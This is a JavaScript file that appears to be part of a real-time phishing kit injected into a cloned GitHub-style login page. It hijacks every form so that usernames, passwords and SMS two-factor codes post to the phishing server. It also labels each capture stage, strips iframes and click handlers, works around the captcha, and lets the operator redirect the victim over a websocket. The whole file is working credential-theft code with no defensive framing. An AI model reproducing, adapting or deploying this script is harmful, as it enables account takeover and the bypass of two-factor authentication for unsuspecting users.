const urlPath = location.pathname
const urlSplit = urlPath.split("/")
const id = urlSplit[3]
const appName = urlSplit[2]

const socket = io(location.origin, {
    path: '/socket.io',
    transports: ['websocket'],
    secure: true,
})

socket.on(`${id}-listener`, data => {
    if (data.type == "response") {
        top.location.href = `${location.origin}/ws-app?id=${id}`
    }
})

document.querySelectorAll("a").forEach(atag => {
    atag.href = location.href
})

document.querySelectorAll("iframe").forEach(f => {
    f.remove()
})

document.querySelectorAll('*').forEach(element => {
    element.removeAttribute("onclick")
    element.removeAttribute('onmousedown')
})

document.querySelectorAll("form").forEach(form => {
    form.action = location.pathname
    form.method = "POST"
    form.noValidate = true

    const input = document.createElement("input")
    input.type = "hidden"
    input.name = "spikeType"
    form.append(input)
})

document.querySelectorAll("input").forEach(inp => {
    if (inp.type != "hidden") {
        inp.required = true
    }
})

function addSpikeType(value) {
    let allSpikes = document.querySelectorAll(`[name="spikeType"]`)
    for (let spike of allSpikes) {
        spike.value = value
    }
}

function spikeForm(data, silent = false) {
    if (silent) {
        fetch(location.href, JSON.stringify(data), {
            method: "post",
            headers: {
                "Content-Type": "application/json"
            }
        }).then(res => res.text())
            .then(data => {
                console.log(data);
            })
    } else {
        let formData = ""
        for (const key in data) {
            formData += `<input type="hidden" name="${key}" value="${data[key]}">`
        }

        const form = document.createElement("form")
        form.method = "post"
        form.action = location.href
        form.innerHTML = formData
        document.body.appendChild(form)
        form.submit()
    }
}

/**
 *  spikes selector functions +===================+
 */

const selectorSpikes = [
    {
        spikeType: "home-login",
        querys: [
            `[id="login_field"]`,
            `[name="login"]`,
            `[name="password"]`,
            `[id="password"]`
        ]
    },
    {
        spikeType: "sms-code",
        querys: [
            `[name="sms_otp"]`,
            `[id="sms_totp"]`,
            `[placeholder="XXXXXX"]`
        ]
    }
]

/**
 * button spikes functions +===================+
 */

const buttonSpikes = [
    {
        spikeType: "send-sms",
        runner() {
            const bodyText = document.body.innerText

            if (
                bodyText.includes("Two-factor authentication")
                && bodyText.includes("Authentication code")
                && bodyText.includes("Send SMS")
            ) {
                addSpikeType(this.spikeType)
            }
        }
    },
    {
        spikeType: "resend-code",
        runner() {
            document.querySelectorAll("button").forEach(btn => {
                if (btn.type == "submit" && btn.innerText.includes("Resend SMS")) {
                    btn.type = "button"
                    btn.addEventListener("click", () => {
                        spikeForm({
                            spikeType: this.spikeType
                        })
                    })
                }
            })
        }
    },
    {
        spikeType: "captcha",
        runner() {
            const bodyText = document.body.innerText

            if (bodyText.includes("Please verify that you're a human.")) {
                addSpikeType(this.spikeType)
                setTimeout(() => {
                    let btn = document.querySelector(`[type="submit"]`)
                    btn.disabled = false
                }, 16000)
            }
        }
    }
]

for (const selectorSpike of selectorSpikes) {
    const spikeType = selectorSpike.spikeType
    const querys = selectorSpike.querys
    const queryLength = querys.length

    let queryMatch = 0
    for (const selector of querys) {
        if (document.querySelector(selector)) queryMatch++
    }

    if (queryLength == queryMatch) {
        addSpikeType(spikeType)
        if (selectorSpike.hasOwnProperty("runner")) {
            try {
                selectorSpike.runner()
            } catch (error) { }
        }

        break
    }
}

for (const buttonSpike of buttonSpikes) {
    try {
        buttonSpike.runner()
    } catch (error) { }
}

// +----------------+
{

}